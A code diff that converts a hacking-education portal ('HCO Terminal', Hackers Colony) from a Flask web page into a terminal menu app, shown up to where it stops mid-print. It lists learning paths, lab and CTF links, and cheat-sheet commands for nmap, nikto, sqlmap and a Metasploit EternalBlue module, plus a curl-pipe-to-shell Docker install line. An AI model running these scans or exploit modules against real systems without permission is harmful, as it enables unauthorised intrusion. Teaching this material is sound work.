@@ -1,692 +1,563 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-HCO Terminal — Neon Portal (single-file)
+HCO Terminal — Terminal Version (No Browser Needed)
 Author: Azhar | Hackers Colony
 Run (Termux):
   pkg update -y
   pkg install python -y
-  pip install flask
   python3 hco_terminal.py
 """
 
-from flask import Flask, render_template_string, request, redirect, url_for, send_file
-import threading, subprocess, shutil, time, webbrowser, os, sys
-import json
+import os
+import sys
+import subprocess
+import shutil
+import time
+import webbrowser
 from datetime import datetime
 
 # ---------- Config ----------
 APP_NAME = "HCO Terminal"
-HOST = "127.0.0.1"
-PORT = 8080
-
 TELEGRAM_LINK = "https://t.me/HackersColony"
 WHATSAPP_LINK = "https://chat.whatsapp.com/BHwZHVntVicI8zdmfbJoQV"
-YOUTUBE_LINK  = "https://youtube.com/@hackers_colony_tech?si=51CiCi_q1_CwiTnc"
-WEBSITE_LINK  = "https://hackerscolonyofficial.blogspot.com/?m=1"
-LEARN_LINK    = "https://tryhackme.com"
+YOUTUBE_LINK = "https://youtube.com/@hackers_colony_tech"
+WEBSITE_LINK = "https://hackerscolonyofficial.blogspot.com"
 
-# ---------- Flask app ----------
-app = Flask(__name__)
-
-# Store active processes
-active_processes = {}
-
-HTML = '''<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>''' + APP_NAME + ''' — Hackers Colony Portal</title>
-<link rel="icon" href="data:,">
-<style>
-  /* Reset */
-  *{box-sizing:border-box;margin:0;padding:0}
-  html,body{height:100%}
-  body {
-    font-family: Inter, "Segoe UI", Roboto, system-ui, -apple-system, sans-serif;
-    background: radial-gradient(1200px 600px at 10% 10%, #07102a 0%, #02020a 35%, #000 100%);
-    color:#e6eef6;
-    -webkit-font-smoothing:antialiased;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:24px;
-  }
-
-  .panel {
-    width:100%;
-    max-width:980px;
-    border-radius:16px;
-    padding:28px;
-    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-    box-shadow: 0 10px 40px rgba(2,6,23,0.7), inset 0 1px 0 rgba(255,255,255,0.02);
-    backdrop-filter: blur(6px);
-  }
-
-  .top {
-    display:flex;
-    align-items:center;
-    gap:18px;
-  }
-  .badge {
-    width:72px;height:72px;border-radius:14px;
-    display:flex;align-items:center;justify-content:center;
-    background: linear-gradient(135deg,#09182b,#05283a);
-    box-shadow: 0 6px 20px rgba(0,170,150,0.08);
-    position:relative;
-    overflow:hidden;
-  }
-  .badge:after{
-    content:"";
-    position:absolute;left:-30px;top:-20px;width:140px;height:140px;
-    background:radial-gradient(circle at 30% 30%, rgba(0,255,170,0.06), transparent 30%);
-    transform:rotate(20deg);
-  }
-  .logo-text{font-weight:800;color:#00ffd6;font-size:20px;text-shadow:0 0 8px rgba(0,255,214,0.06)}
-
-  h1{font-size:20px;color:#00ffd6;margin:0}
-  p.lead{color:#9fb3c2;margin-top:6px}
-
-  .grid {
-    display:grid;
-    grid-template-columns: repeat(auto-fit,minmax(220px,1fr));
-    gap:14px;
-    margin-top:20px;
-  }
-
-  .card {
-    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-    padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.02);
-    transition: transform .18s ease, box-shadow .18s ease, background .18s ease;
-    cursor:pointer;
-  }
-  .card:hover{ transform: translateY(-6px); box-shadow: 0 12px 30px rgba(0,255,180,0.06); background: rgba(255,255,255,0.03)}
-  .card h3{margin-bottom:8px;color:#e8fffb}
-  .card p{color:#9fb3c2;font-size:14px;line-height:1.45}
-
-  .cta-row{display:flex;flex-wrap:wrap;gap:10px;margin-top:22px;align-items:center}
-  .btn {
-    display:inline-flex;align-items:center;gap:8px;
-    padding:12px 16px;border-radius:12px;text-decoration:none;
-    font-weight:700;color:#071025;background:#00ffd6;border:none;cursor:pointer;
-    box-shadow:0 10px 30px rgba(0,255,214,0.06);
-    transition: transform .14s ease, box-shadow .14s ease, opacity .14s;
-  }
-  .btn.ghost{background:transparent;color:#9fb3c2;border:1px solid rgba(255,255,255,0.03)}
-  .btn:hover{transform:translateY(-4px)}
-
-  .links { margin-top:18px; display:flex; gap:10px; flex-wrap:wrap; }
-  .links a { text-decoration:none; padding:10px 12px; border-radius:10px; background: rgba(255,255,255,0.02); color:#cfeeea; font-weight:700; }
-
-  footer { margin-top:22px; color:#7f9aa3; font-size:13px; text-align:center; }
-
-  /* floating glow */
-  .glow {
-    position:absolute;right:28px;top:28px;width:220px;height:220px;border-radius:50%;
-    filter: blur(60px); opacity:0.25; background: radial-gradient(circle,#00ffd6 0%, transparent 40%);
-    transform: translateZ(0);
-  }
-
-  /* Terminal output */
-  .terminal {
-    background: #0a0e1a;
-    border: 1px solid rgba(0,255,214,0.1);
-    border-radius: 8px;
-    padding: 16px;
-    margin-top: 16px;
-    font-family: 'Courier New', monospace;
-    font-size: 14px;
-    color: #00ffd6;
-    max-height: 300px;
-    overflow-y: auto;
-    white-space: pre-wrap;
-  }
-
-  .status {
-    padding: 8px 12px;
-    border-radius: 6px;
-    margin: 10px 0;
-    font-size: 14px;
-  }
-  .status.running { background: rgba(0,255,214,0.1); color: #00ffd6; }
-  .status.stopped { background: rgba(255,0,0,0.1); color: #ff4444; }
-
-  @media (max-width:560px) {
-    .top {flex-direction:row;gap:12px}
-    .badge{width:56px;height:56px}
-  }
-</style>
-</head>
-<body>
-  <div class="panel">
-    <div style="position:relative">
-      <div class="glow"></div>
-      <div class="top">
-        <div class="badge"><div class="logo-text">HCO</div></div>
-        <div style="flex:1">
-          <h1>Welcome to Hackers Colony — Hacking Portal</h1>
-          <p class="lead">Ethical learning, practice labs & community | Only test on systems you own or have permission to test.</p>
-        </div>
-      </div>
-
-      <div class="grid" style="margin-top:20px">
-        <div class="card" onclick="location.href='/learn'">
-          <h3>📚 Learn Hacking</h3>
-          <p>Guided learning path, foundational topics and recommended courses.</p>
-        </div>
-
-        <div class="card" onclick="location.href='/labs'">
-          <h3>🧪 Practice Labs</h3>
-          <p>Start safe labs (TryHackMe, Juice Shop) and local vulnerable VMs in isolated environments.</p>
-        </div>
-
-        <div class="card" onclick="location.href='/tutorials'">
-          <h3>🎯 Tutorials</h3>
-          <p>Step-by-step tutorials and curated YouTube lessons to follow along.</p>
-        </div>
-
-        <div class="card" onclick="location.href='/tools'">
-          <h3>🛠 Tools & Guides</h3>
-          <p>Learn how to use Nmap, Wireshark, Burp, and defensive tooling responsibly.</p>
-        </div>
-
-        <div class="card" onclick="location.href='/ctf'">
-          <h3>🏁 CTF Exercises</h3>
-          <p>Beginner CTFs, challenges and walkthroughs to build practical skills.</p>
-        </div>
-      </div>
-
-      <div class="cta-row">
-        <a class="btn" href="/join/telegram" target="_blank">Join Telegram</a>
-        <a class="btn" href="/join/whatsapp" target="_blank" style="background:#25D366;color:#02120b">Join WhatsApp</a>
-        <a class="btn ghost" href="/join/youtube" target="_blank">Watch Tutorials</a>
-        <a class="btn ghost" href="''' + WEBSITE_LINK + '''" target="_blank">Official Website</a>
-      </div>
-
-      <div class="links">
-        <a href="/download/cheatsheet">Download Cheat-sheet</a>
-        <a href="/contact">Contact</a>
-      </div>
-
-      <footer>Made with ❤️ by Hackers Colony — Educational & ethical use only.</footer>
-    </div>
-  </div>
-
-<script>
-  // tiny animation: pulse glow
-  const glow = document.querySelector('.glow');
-  let tick = 0;
-  setInterval(()=>{ tick += 0.02; glow.style.opacity = 0.18 + Math.sin(tick)*0.03; }, 50);
-</script>
-</body>
-</html>'''
+# ---------- Colors ----------
+class Colors:
+    GREEN = '\033[92m'
+    CYAN = '\033[96m'
+    BLUE = '\033[94m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    PURPLE = '\033[95m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
 
 # ---------- Utility Functions ----------
+def clear_screen():
+    os.system('clear')
+
+def print_banner():
+    banner = f"""
+{Colors.CYAN}{Colors.BOLD}
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║    ██╗  ██╗ ██████╗ ██████╗ ███████╗███████╗██████╗         ║
+║    ██║  ██║██╔════╝██╔════╝ ██╔════╝██╔════╝██╔══██╗        ║
+║    ███████║██║     ██║  ███╗█████╗  █████╗  ██████╔╝        ║
+║    ██╔══██║██║     ██║   ██║██╔══╝  ██╔══╝  ██╔══██╗        ║
+║    ██║  ██║╚██████╗╚██████╔╝███████╗███████╗██║  ██║        ║
+║    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝        ║
+║                                                              ║
+║    {Colors.GREEN}HACKERS COLONY TERMINAL - ETHICAL HACKING PORTAL{Colors.CYAN}     ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+{Colors.END}
+"""
+    print(banner)
+
+def print_menu():
+    menu = f"""
+{Colors.BOLD}{Colors.CYAN}MAIN MENU:{Colors.END}
+
+{Colors.GREEN}1.{Colors.END} 📚 Learn Ethical Hacking
+{Colors.GREEN}2.{Colors.END} 🧪 Practice Labs & Setup
+{Colors.GREEN}3.{Colors.END} 🛠 Tools & Installation Guide
+{Colors.GREEN}4.{Colors.END} 🏁 CTF Challenges
+{Colors.GREEN}5.{Colors.END} 🔗 Community Links
+{Colors.GREEN}6.{Colors.END} 🖥 System Check
+{Colors.GREEN}7.{Colors.END} 📋 Cheat Sheets
+{Colors.GREEN}8.{Colors.END} 🚀 Quick Start Commands
+{Colors.GREEN}0.{Colors.END} ❌ Exit
+
+{Colors.YELLOW}Choose an option (0-8): {Colors.END}"""
+    print(menu)
+
 def check_tool_installed(tool_name):
-    """Check if a tool is installed on the system"""
+    """Check if a tool is installed"""
     return shutil.which(tool_name) is not None
 
-def run_command(cmd, timeout=30):
-    """Run a shell command and return output"""
+def run_command(cmd):
+    """Run a command and show output"""
     try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
-        return {
-            'success': result.returncode == 0,
-            'output': result.stdout,
-            'error': result.stderr,
-            'returncode': result.returncode
-        }
-    except subprocess.TimeoutExpired:
-        return {'success': False, 'output': '', 'error': 'Command timed out', 'returncode': -1}
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        return result
     except Exception as e:
-        return {'success': False, 'output': '', 'error': str(e), 'returncode': -1}
+        return None
 
-def create_cheatsheet():
-    """Create a basic ethical hacking cheatsheet"""
-    content = """HCO Ethical Hacking Cheat Sheet
-========================
+def press_enter_to_continue():
+    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
 
-Basic Commands:
----------------
-• nmap -sS -sV -O target.com
-• nikto -h target.com
-• dirb http://target.com
+def show_learn_hacking():
+    clear_screen()
+    print_banner()
+    print(f"{Colors.BOLD}{Colors.CYAN}📚 LEARN ETHICAL HACKING{Colors.END}\n")
+    
+    content = f"""
+{Colors.GREEN}🔰 Beginner Path:{Colors.END}
+1. Networking Fundamentals
+2. Linux Basics & Command Line
+3. Programming (Python/Bash)
+4. Security Concepts & Terminology
 
-Common Ports:
--------------
-21 - FTP, 22 - SSH, 80 - HTTP, 443 - HTTPS
-3306 - MySQL, 5432 - PostgreSQL
+{Colors.YELLOW}🎯 Intermediate Topics:{Colors.END}
+• Web Application Security
+• Network Penetration Testing  
+• Wireless Security
+• Social Engineering
+• Cryptography Basics
 
-Web Testing:
-------------
-• Always get permission first
-• Use Burp Suite for web app testing
-• Test for SQL injection, XSS, CSRF
+{Colors.RED}🏆 Advanced Skills:{Colors.END}
+• Reverse Engineering
+• Exploit Development
+• Digital Forensics
+• Malware Analysis
 
-Legal Notice:
--------------
-Only test systems you own or have explicit written permission to test.
-Unauthorized access is illegal and unethical.
+{Colors.CYAN}📚 Recommended Resources:{Colors.END}
+• TryHackMe: https://tryhackme.com
+• Hack The Box: https://hackthebox.com
+• Cybrary: https://cybrary.it
+• HCO YouTube: {YOUTUBE_LINK}
 
-Stay Ethical! 🛡️
+{Colors.GREEN}🚀 Getting Started:{Colors.END}
+1. Start with TryHackMe 'Beginner Path'
+2. Practice Linux commands daily
+3. Learn basic Python scripting
+4. Join HCO community for guidance
 """
-    filename = "hco_cheatsheet.txt"
-    with open(filename, 'w') as f:
-        f.write(content)
-    return filename
+    print(content)
+    press_enter_to_continue()
 
-# ---------- Routes ----------
-@app.route('/')
-def index():
-    return render_template_string(HTML)
-
-@app.route('/join/<platform>')
-def join_platform(platform):
-    platforms = {
-        'telegram': TELEGRAM_LINK,
-        'whatsapp': WHATSAPP_LINK,
-        'youtube': YOUTUBE_LINK
-    }
-    link = platforms.get(platform)
-    if link:
-        return redirect(link)
-    return redirect('/')
-
-@app.route('/learn')
-def learn():
-    content = """
-    <div class="panel">
-        <div style="position:relative">
-            <a href="/" style="color:#00ffd6; text-decoration:none;">← Back</a>
-            <h1 style="margin:20px 0;color:#00ffd6">📚 Learn Ethical Hacking</h1>
-            
-            <div class="card">
-                <h3>🔰 Beginner Path</h3>
-                <p>1. Networking Fundamentals<br>2. Linux Basics<br>3. Programming (Python/Bash)<br>4. Security Concepts</p>
-            </div>
-            
-            <div class="card">
-                <h3>🎯 Intermediate Topics</h3>
-                <p>• Web Application Security<br>• Network Penetration Testing<br>• Wireless Security<br>• Social Engineering</p>
-            </div>
-            
-            <div class="card">
-                <h3>🏆 Advanced Skills</h3>
-                <p>• Reverse Engineering<br>• Exploit Development<br>• Digital Forensics<br>• Malware Analysis</p>
-            </div>
-            
-            <div class="terminal">
-# Recommended Learning Resources:
-- TryHackMe: https://tryhackme.com
-- Hack The Box: https://hackthebox.com
-- Cybrary: https://cybrary.it
-- HCO YouTube Tutorials
-            </div>
-            
-            <div style="margin-top:20px">
-                <a class="btn" href="https://tryhackme.com" target="_blank">Start Learning</a>
-            </div>
-        </div>
-    </div>
-    """
-    return render_template_string(HTML.replace('</body>', f'{content}</body>').replace('HCO Terminal — Hackers Colony Portal', 'Learn - HCO Terminal'))
-
-@app.route('/labs')
-def labs():
-    # Check available tools
-    tools_status = {
+def show_practice_labs():
+    clear_screen()
+    print_banner()
+    print(f"{Colors.BOLD}{Colors.CYAN}🧪 PRACTICE LABS & SETUP{Colors.END}\n")
+    
+    # Check tools
+    tools = {
         'docker': check_tool_installed('docker'),
         'python3': check_tool_installed('python3'),
         'git': check_tool_installed('git')
     }
     
-    tools_text = "\n".join([f"{'✅' if status else '❌'} {tool}" for tool, status in tools_status.items()])
+    print(f"{Colors.YELLOW}🛠 Available Tools:{Colors.END}")
+    for tool, installed in tools.items():
+        status = f"{Colors.GREEN}✅ INSTALLED{Colors.END}" if installed else f"{Colors.RED}❌ MISSING{Colors.END}"
+        print(f"  {status} {tool}")
     
-    content = f"""
-    <div class="panel">
-        <div style="position:relative">
-            <a href="/" style="color:#00ffd6; text-decoration:none;">← Back</a>
-            <h1 style="margin:20px 0;color:#00ffd6">🧪 Practice Labs</h1>
-            
-            <div class="terminal">
-# Available Tools:
-{tools_text}
+    print(f"""
+{Colors.CYAN}🏠 Safe Practice Environments:{Colors.END}
 
-# Safe Practice Environments:
-1. TryHackMe - Beginner friendly
-2. Hack The Box - Intermediate/Advanced
-3. VulnHub VMs - Realistic scenarios
-4. OWASP Juice Shop - Web app practice
-            </div>
-            
-            <div class="card" onclick="location.href='/start_lab/owasp'">
-                <h3>🛡️ OWASP Juice Shop</h3>
-                <p>Modern vulnerable web application for learning web security.</p>
-            </div>
-            
-            <div class="card" onclick="location.href='/start_lab/metasploitable'">
-                <h3>🎯 Metasploitable</h3>
-                <p>Intentionally vulnerable VM for penetration testing practice.</p>
-            </div>
-            
-            <div style="margin-top:20px">
-                <a class="btn" href="https://tryhackme.com" target="_blank">TryHackMe</a>
-                <a class="btn ghost" href="https://www.hackthebox.com" target="_blank">HackTheBox</a>
-            </div>
-        </div>
-    </div>
-    """
-    return render_template_string(HTML.replace('</body>', f'{content}</body>').replace('HCO Terminal — Hackers Colony Portal', 'Labs - HCO Terminal'))
+{Colors.GREEN}1. TryHackMe (Online){Colors.END}
+   • Beginner-friendly
+   • Guided learning paths
+   • Web: https://tryhackme.com
 
-@app.route('/start_lab/<lab_name>')
-def start_lab(lab_name):
-    output = ""
-    if lab_name == "owasp":
-        output = """
-# To run OWASP Juice Shop locally:
+{Colors.GREEN}2. Hack The Box (Online){Colors.END}  
+   • Intermediate/Advanced
+   • Real-world machines
+   • Web: https://hackthebox.com
 
-# Using Docker (recommended):
-docker pull bkimminich/juice-shop
-docker run -d -p 3000:3000 bkimminich/juice-shop
+{Colors.GREEN}3. OWASP Juice Shop (Local){Colors.END}
+   • Modern vulnerable web app
+   • Run with: docker run -p 3000:3000 bkimminich/juice-shop
+   • Access: http://localhost:3000
 
-# Then open: http://localhost:3000
+{Colors.GREEN}4. Metasploitable (Local VM){Colors.END}
+   • Download: https://sourceforge.net/projects/metasploitable/
+   • Run in VirtualBox/VMware
+   • ⚠️ Use isolated network only!
 
-# Or use the online version:
-# https://juice-shop.herokuapp.com
-        """
-    elif lab_name == "metasploitable":
-        output = """
-# Metasploitable Setup:
+{Colors.YELLOW}🔧 Setup Commands:{Colors.END}
+• Install Docker: curl -fsSL https://get.docker.com | sh
+• Start Juice Shop: docker run -d -p 3000:3000 bkimminich/juice-shop
+""")
+    press_enter_to_continue()
 
-1. Download from:
-   https://sourceforge.net/projects/metasploitable/
-
-2. Run in VirtualBox/VMware
-
-3. Login credentials:
-   msfadmin:msfadmin
-
-⚠️  WARNING: Only run on isolated network!
-        """
+def show_tools_guide():
+    clear_screen()
+    print_banner()
+    print(f"{Colors.BOLD}{Colors.CYAN}🛠 TOOLS & INSTALLATION GUIDE{Colors.END}\n")
     
-    content = f"""
-    <div class="panel">
-        <div style="position:relative">
-            <a href="/labs" style="color:#00ffd6; text-decoration:none;">← Back to Labs</a>
-            <h1 style="margin:20px 0;color:#00ffd6">🚀 Starting {lab_name.title()}</h1>
-            
-            <div class="terminal">{output}</div>
-            
-            <div style="margin-top:20px">
-                <a class="btn" href="/labs">More Labs</a>
-            </div>
-        </div>
-    </div>
-    """
-    return render_template_string(HTML.replace('</body>', f'{content}</body>').replace('HCO Terminal — Hackers Colony Portal', f'Starting {lab_name} - HCO Terminal'))
-
-@app.route('/tutorials')
-def tutorials():
-    content = """
-    <div class="panel">
-        <div style="position:relative">
-            <a href="/" style="color:#00ffd6; text-decoration:none;">← Back</a>
-            <h1 style="margin:20px 0;color:#00ffd6">🎯 Tutorials & Guides</h1>
-            
-            <div class="card" onclick="window.open('/join/youtube', '_blank')">
-                <h3>📹 Video Tutorials</h3>
-                <p>Step-by-step hacking tutorials on YouTube covering various topics.</p>
-            </div>
-            
-            <div class="card">
-                <h3>📖 Written Guides</h3>
-                <p>Detailed articles and walkthroughs for different hacking techniques.</p>
-            </div>
-            
-            <div class="terminal">
-# Popular Tutorial Topics:
-
-1. Setting Up Kali Linux
-2. Basic Nmap Scanning
-3. Web Application Testing
-4. Wireless Network Security
-5. Social Engineering Awareness
-6. Cryptography Basics
-7. Digital Forensics Introduction
-
-# Quick Commands Tutorial:
-nmap -A -T4 target.com  # Aggressive scan
-sqlmap -u "http://site.com/page?param=1" --dbs
-burpsuite &  # Start Burp Suite
-            </div>
-            
-            <div style="margin-top:20px">
-                <a class="btn" href="/join/youtube" target="_blank">Watch Videos</a>
-            </div>
-        </div>
-    </div>
-    """
-    return render_template_string(HTML.replace('</body>', f'{content}</body>').replace('HCO Terminal — Hackers Colony Portal', 'Tutorials - HCO Terminal'))
-
-@app.route('/tools')
-def tools():
     # Check common tools
-    tools = ['nmap', 'wireshark', 'python3', 'git', 'curl', 'nikto', 'sqlmap']
+    tools = ['nmap', 'wireshark', 'python3', 'git', 'curl', 'nikto', 'sqlmap', 'metasploit-framework']
     tools_status = {tool: check_tool_installed(tool) for tool in tools}
     
-    tools_list = "\n".join([f"{'✅' if status else '❌'} {tool}" for tool, status in tools_status.items()])
+    print(f"{Colors.YELLOW}🔍 Tool Status Check:{Colors.END}")
+    for tool, installed in tools_status.items():
+        status = f"{Colors.GREEN}✅ INSTALLED{Colors.END}" if installed else f"{Colors.RED}❌ MISSING{Colors.END}"
+        print(f"  {status} {tool}")
     
-    content = f"""
-    <div class="panel">
-        <div style="position:relative">
-            <a href="/" style="color:#00ffd6; text-decoration:none;">← Back</a>
-            <h1 style="margin:20px 0;color:#00ffd6">🛠 Tools & Guides</h1>
-            
-            <div class="terminal">
-# Installed Tools Check:
-{tools_list}
+    print(f"""
+{Colors.CYAN}📦 Installation Commands:{Colors.END}
 
-# Essential Tools Guide:
+{Colors.GREEN}For Termux:{Colors.END}
+pkg update && pkg install python nmap git curl -y
+pip install requests bs4
 
-• Nmap - Network scanning
+{Colors.GREEN}For Kali Linux:{Colors.END}
+sudo apt update
+sudo apt install nmap wireshark nikto sqlmap metasploit-framework -y
+
+{Colors.CYAN}🛠 Essential Tools Usage:{Colors.END}
+
+{Colors.GREEN}• Nmap (Network Scanner){Colors.END}
   nmap -sS -sV -O target.com
+  nmap -A -T4 192.168.1.0/24
 
-• Wireshark - Packet analysis
-  wireshark &  # GUI version
-
-• Nikto - Web server scanner
+{Colors.GREEN}• Nikto (Web Scanner){Colors.END}
   nikto -h http://target.com
 
-• SQLMap - SQL injection tool
-  sqlmap -u "http://site.com/page?id=1"
-            </div>
-            
-            <div class="card">
-                <h3>📋 Tool Installation</h3>
-                <p>sudo apt update && sudo apt install nmap wireshark nikto sqlmap</p>
-            </div>
-            
-            <div style="margin-top:20px">
-                <a class="btn" href="/download/cheatsheet">Download Cheat Sheet</a>
-            </div>
-        </div>
-    </div>
-    """
-    return render_template_string(HTML.replace('</body>', f'{content}</body>').replace('HCO Terminal — Hackers Colony Portal', 'Tools - HCO Terminal'))
+{Colors.GREEN}• SQLMap (SQL Injection){Colors.END}
+  sqlmap -u "http://site.com/page?id=1" --dbs
 
-@app.route('/ctf')
-def ctf():
-    content = """
-    <div class="panel">
-        <div style="position:relative">
-            <a href="/" style="color:#00ffd6; text-decoration:none;">← Back</a>
-            <h1 style="margin:20px 0;color:#00ffd6">🏁 CTF Exercises</h1>
-            
-            <div class="card">
-                <h3>🔓 Beginner CTFs</h3>
-                <p>• OverTheWire: Bandit, Natas<br>• PicoCTF<br>• TryHackMe Beginner Path</p>
-            </div>
-            
-            <div class="card">
-                <h3>⚡ Intermediate Challenges</h3>
-                <p>• Hack The Box Starting Point<br>• VulnHub Machines<br>• CTFtime.org Events</p>
-            </div>
-            
-            <div class="terminal">
-# CTF Categories:
+{Colors.GREEN}• Metasploit{Colors.END}
+  msfconsole
+  use exploit/windows/smb/ms17_010_eternalblue
+""")
+    press_enter_to_continue()
 
-1. Web Exploitation
-2. Cryptography
-3. Reverse Engineering
-4. Forensics
-5. Binary Exploitation
-6. Miscellaneous
+def show_ctf_challenges():
+    clear_screen()
+    print_banner()
+    print(f"{Colors.BOLD}{Colors.CYAN}🏁 CTF CHALLENGES{Colors.END}\n")
+    
+    content = f"""
+{Colors.GREEN}🔓 Beginner CTF Platforms:{Colors.END}
 
-# Getting Started:
-- OverTheWire: https://overthewire.org
-- PicoCTF: https://picoctf.org
-- CTFtime: https://ctftime.org
+{Colors.CYAN}1. OverTheWire:{Colors.END}
+   • Bandit (Linux basics): ssh bandit0@bandit.labs.overthewire.org -p 2220
+   • Natas (Web security): http://natas.labs.overthewire.org
+   • Website: https://overthewire.org
 
-# Practice Commands:
-file challenge.bin      # Check file type
-strings file.txt        # Extract strings
-binwalk image.jpg       # Analyze firmware
-            </div>
-            
-            <div style="margin-top:20px">
-                <a class="btn" href="https://overthewire.org" target="_blank">OverTheWire</a>
-                <a class="btn ghost" href="https://picoctf.org" target="_blank">PicoCTF</a>
-            </div>
-        </div>
-    </div>
-    """
-    return render_template_string(HTML.replace('</body>', f'{content}</body>').replace('HCO Terminal — Hackers Colony Portal', 'CTF - HCO Terminal'))
+{Colors.CYAN}2. PicoCTF:{Colors.END}
+   • Great for absolute beginners
+   • Annual competition + practice
+   • Website: https://picoctf.org
 
-@app.route('/download/cheatsheet')
-def download_cheatsheet():
-    filename = create_cheatsheet()
-    return send_file(filename, as_attachment=True, download_name='hco_ethical_hacking_cheatsheet.txt')
+{Colors.CYAN}3. TryHackMe CTFs:{Colors.END}
+   • Guided CTF rooms
+   • Step-by-step walkthroughs
+   • Website: https://tryhackme.com
 
-@app.route('/contact')
-def contact():
-    content = """
-    <div class="panel">
-        <div style="position:relative">
-            <a href="/" style="color:#00ffd6; text-decoration:none;">← Back</a>
-            <h1 style="margin:20px 0;color:#00ffd6">📞 Contact & Support</h1>
-            
-            <div class="card">
-                <h3>📱 Social Media</h3>
-                <p>• Telegram: @HackersColony<br>• YouTube: @hackers_colony_tech<br>• WhatsApp Group</p>
-            </div>
-            
-            <div class="card">
-                <h3>🌐 Website</h3>
-                <p>https://hackerscolonyofficial.blogspot.com</p>
-            </div>
-            
-            <div class="terminal">
-# Important Notice:
+{Colors.YELLOW}⚡ Intermediate Platforms:{Colors.END}
 
-This portal is for educational purposes only.
-Always practice ethical hacking principles.
+{Colors.CYAN}• Hack The Box{Colors.END}
+  • Realistic machines
+  • Active community
+  • https://hackthebox.com
 
+{Colors.CYAN}• CTFtime{Colors.END}
+  • CTF calendar & writeups
+  • https://ctftime.org
+
+{Colors.GREEN}🔧 CTF Tool Commands:{Colors.END}
+
+• File analysis:
+  file challenge.bin
+  strings file.txt
+  binwalk image.jpg
+
+• Steganography:
+  steghide extract -sf image.jpg
+  exiftool image.jpg
+
+• Web challenges:
+  curl -X POST http://target.com
+  dirb http://target.com
+"""
+    print(content)
+    press_enter_to_continue()
+
+def show_community_links():
+    clear_screen()
+    print_banner()
+    print(f"{Colors.BOLD}{Colors.CYAN}🔗 COMMUNITY LINKS{Colors.END}\n")
+    
+    content = f"""
+{Colors.GREEN}📱 Join Our Communities:{Colors.END}
+
+{Colors.CYAN}💬 Telegram Group:{Colors.END}
+{TELEGRAM_LINK}
+• Daily updates & discussions
+• Q&A support
+• Resource sharing
+
+{Colors.GREEN}📞 WhatsApp Group:{Colors.END}  
+{WHATSAPP_LINK}
+• Community chat
+• Quick help
+• Local community
+
+{Colors.RED}🎥 YouTube Channel:{Colors.END}
+{YOUTUBE_LINK}
+• Tutorial videos
+• Walkthroughs
+• Tool demonstrations
+
+{Colors.BLUE}🌐 Official Website:{Colors.END}
+{WEBSITE_LINK}
+• Articles & blogs
+• Latest updates
+• Resource library
+
+{Colors.YELLOW}📢 Important Notice:{Colors.END}
+• Always practice ethical hacking
 • Only test systems you own
 • Get proper authorization
 • Respect privacy and laws
-• Help improve security
 
-# Stay Legal, Stay Ethical! 🔐
-            </div>
-            
-            <div style="margin-top:20px">
-                <a class="btn" href="/join/telegram">Telegram</a>
-                <a class="btn" href="/join/whatsapp">WhatsApp</a>
-                <a class="btn ghost" href="/join/youtube">YouTube</a>
-            </div>
-        </div>
-    </div>
-    """
-    return render_template_string(HTML.replace('</body>', f'{content}</body>').replace('HCO Terminal — Hackers Colony Portal', 'Contact - HCO Terminal'))
+{Colors.GREEN}🤝 Community Guidelines:{Colors.END}
+• Help each other learn
+• Share knowledge
+• Stay respectful
+• Keep it legal & ethical
+"""
+    print(content)
+    
+    print(f"\n{Colors.YELLOW}Open link in browser? (y/n): {Colors.END}", end='')
+    choice = input().lower()
+    if choice == 'y':
+        print(f"{Colors.CYAN}1. Telegram\n2. WhatsApp\n3. YouTube\n4. Website{Colors.END}")
+        print(f"{Colors.YELLOW}Choose (1-4): {Colors.END}", end='')
+        link_choice = input()
+        links = {
+            '1': TELEGRAM_LINK,
+            '2': WHATSAPP_LINK, 
+            '3': YOUTUBE_LINK,
+            '4': WEBSITE_LINK
+        }
+        if link_choice in links:
+            webbrowser.open(links[link_choice])
+            print(f"{Colors.GREEN}Opening browser...{Colors.END}")
+    
+    press_enter_to_continue()
 
-@app.route('/system/check')
-def system_check():
-    """Check system tools and provide installation commands"""
-    tools = ['python3', 'git', 'docker', 'nmap', 'wireshark', 'nikto']
+def show_system_check():
+    clear_screen()
+    print_banner()
+    print(f"{Colors.BOLD}{Colors.CYAN}🖥 SYSTEM CHECK{Colors.END}\n")
+    
+    # Check system info
+    tools = ['python3', 'git', 'docker', 'nmap', 'wireshark', 'nikto', 'sqlmap']
     results = {}
     
     for tool in tools:
         results[tool] = check_tool_installed(tool)
     
-    output = "System Tools Check:\n\n"
+    print(f"{Colors.YELLOW}🔧 Tool Status:{Colors.END}")
     for tool, installed in results.items():
-        status = "✅ INSTALLED" if installed else "❌ MISSING"
-        output += f"{status} {tool}\n"
+        status = f"{Colors.GREEN}✅ INSTALLED{Colors.END}" if installed else f"{Colors.RED}❌ MISSING{Colors.END}"
+        print(f"  {status} {tool}")
     
-    output += "\nInstall missing tools:\n"
-    output += "sudo apt update && sudo apt install python3 git nmap wireshark nikto\n"
-    output += "# Docker: curl -fsSL https://get.docker.com | sh\n"
+    # System information
+    print(f"\n{Colors.YELLOW}💻 System Information:{Colors.END}")
+    try:
+        # Python version
+        print(f"  Python: {sys.version.split()[0]}")
+        
+        # Platform
+        if hasattr(os, 'uname'):
+            uname = os.uname()
+            print(f"  System: {uname.sysname} {uname.machine}")
+        
+        # Current directory
+        print(f"  Directory: {os.getcwd()}")
+        
+    except Exception as e:
+        print(f"  System info: Unable to retrieve")
+    
+    print(f"""
+{Colors.CYAN}🚀 Quick Installation:{Colors.END}
+
+{Colors.GREEN}For missing tools:{Colors.END}
+sudo apt update && sudo apt install python3 git nmap nikto -y
+
+{Colors.GREEN}For Docker:{Colors.END}
+curl -fsSL https://get.docker.com | sh
+
